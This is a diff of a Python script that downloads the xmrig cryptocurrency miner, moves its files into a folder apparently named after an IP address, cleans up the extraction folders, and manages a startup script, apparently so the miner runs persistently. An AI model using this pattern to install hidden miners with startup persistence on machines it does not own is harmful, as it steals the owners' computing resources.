@@ -95,15 +95,30 @@ def main():
     # Download the zip file
     download_file(URL, FILENAME)
 
-    # Extract the zip file
-    extract_zip(FILENAME, EXTRACT_DIR)
+    # Extract the zip file to a temporary directory
+    temp_extract_dir = os.path.join(EXTRACT_BASE_DIR, "temp_xmrig")
+    extract_zip(FILENAME, temp_extract_dir)
 
-    # Find the extracted xmrig directory
-    extracted_folders = [f for f in os.listdir(EXTRACT_DIR) if os.path.isdir(os.path.join(EXTRACT_DIR, f)) and "xmrig" in f.lower()]
+    # Find the extracted xmrig directory and move its contents
+    extracted_folders = [f for f in os.listdir(temp_extract_dir) if os.path.isdir(os.path.join(temp_extract_dir, f)) and "xmrig" in f.lower()]
     if extracted_folders:
-        extracted_dir = os.path.join(EXTRACT_DIR, extracted_folders[0])
-        xmrig_path = os.path.join(extracted_dir, "xmrig.exe")
-        os.chdir(extracted_dir)
+        extracted_dir = os.path.join(temp_extract_dir, extracted_folders[0])
+
+        # Move all contents of the "xmrig" directory to the IP-named folder
+        for item in os.listdir(extracted_dir):
+            source_item = os.path.join(extracted_dir, item)
+            destination_item = os.path.join(EXTRACT_DIR, item)
+            if os.path.isdir(source_item):
+                shutil.move(source_item, destination_item)
+            else:
+                shutil.move(source_item, destination_item)
+
+        # Clean up the "xmrig" folder and temporary extraction folder
+        shutil.rmtree(extracted_dir)
+        os.rmdir(temp_extract_dir)
+
+        # Define the path to the xmrig executable
+        xmrig_path = os.path.join(EXTRACT_DIR, "xmrig.exe")
 
         # Clean up previous startup script if exists
         if os.path.exists(STARTUP_PATH):
